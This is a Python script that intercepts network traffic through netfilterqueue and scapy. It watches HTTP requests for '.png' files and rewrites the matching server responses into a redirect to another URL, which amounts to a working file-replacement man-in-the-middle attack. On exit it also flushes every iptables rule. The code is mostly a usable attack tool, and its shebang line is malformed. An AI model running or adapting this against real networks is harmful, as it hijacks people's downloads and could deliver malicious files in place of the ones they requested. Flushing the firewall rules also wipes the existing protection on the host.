#!/usr/bin/dev python

import netfilterqueue
import scapy.all as scapy
import subprocess

def execute_system_command(command):
    """
    Execute a system command.
    
    :param command: List of command strings.
    """
    try:
        subprocess.run(command, check=True)
        print(f"Executed command: {' '.join(command)}")
    except subprocess.CalledProcessError as error:
        print(f"Error executing {' '.join(command)}: {error}")

def setup_network_configuration():
    """
    Configure network settings and iptables rules.
    """
    commands = [
        ["sysctl", "-w", "net.ipv4.ip_forward=1"],
        ["iptables", "-I", "INPUT", "-j", "NFQUEUE", "--queue-num", "0"],
        ["iptables", "-I", "OUTPUT", "-j", "NFQUEUE", "--queue-num", "0"]
        # ["iptables", "-I", "FORWARD", "-j", "NFQUEUE", "--queue-num", "0"]
    ]

    for command in commands:
        execute_system_command(command)

def clear_iptables():
    """
    Flush iptables rules and delete chains.
    """
    commands = [
        ["iptables", "--flush"],
        ["iptables", "--delete-chain"]
    ]

    for command in commands:
        try:
            subprocess.run(command, check=True)
            print(f"Cleared iptables with command: {' '.join(command)}")
        except subprocess.CalledProcessError as error:
            print(f"Error clearing iptables: {error}")

ack_list=[]
def process_network_packet(packet):
    try:
        scapy_packet = scapy.IP(packet.get_payload())
        if scapy_packet.haslayer(scapy.Raw):
            if scapy_packet.haslayer(scapy.TCP):
                if scapy_packet[scapy.TCP].dport in [80, 443]:
                    if ".png" in str(scapy_packet[scapy.Raw].load):
                        ack_list.append(scapy_packet[scapy.TCP].ack)
                        print("[+] Request")
                        # print(scapy_packet.show())
                    # print(scapy_packet[scapy.TCP])
                    # print("Request")
                elif scapy_packet[scapy.TCP].sport in [80,443]:
                    if scapy_packet[scapy.TCP].seq in ack_list:
                        print("replacing file")
                        print(ack_list)
                        # print(scapy_packet.show())
                        ack_list.remove(scapy_packet[scapy.TCP].seq)
                        scapy_packet[scapy.Raw].load="HTTP/1.1 301 Moved Permanently\nLocation: https://media.istockphoto.com/id/1459581852/photo/digital-transformation-concept-high-speed-agile-development.jpg?s=1024x1024&w=is&k=20&c=r9jkcQE1JnobYkW_zmfc11SuZAZG2UqkhDMd-IK_j-c=\n\n"
                        del scapy_packet[scapy.IP].len
                        del scapy_packet[scapy.IP].chksum
                        del scapy_packet[scapy.TCP].chksum
                        packet.set_payload(bytes(scapy_packet))
                        print((scapy.IP(packet.get_payload())).show())
                    # print("Response")
                    pass
    except IndexError as ex:
        print(f"Packet parsing error: {ex}")
    except Exception as ex:
        print(f"Unexpected error: {ex}")
    finally:
        packet.accept()
        # pass

def main():
    try:
        setup_network_configuration()
        queue = netfilterqueue.NetfilterQueue()
        queue.bind(0, process_network_packet)
        print("Starting packet processing...")
        queue.run()
    except KeyboardInterrupt:
        print("Stopping packet processing...")
    except Exception as error:
        print(f"An unexpected error occurred: {error}")
    finally:
        try:
            queue.unbind()
        except NameError:
            print("Queue not initialized.")
        clear_iptables()
        print("Queue unbound and iptables cleared.")


if __name__=="__main__":
    main()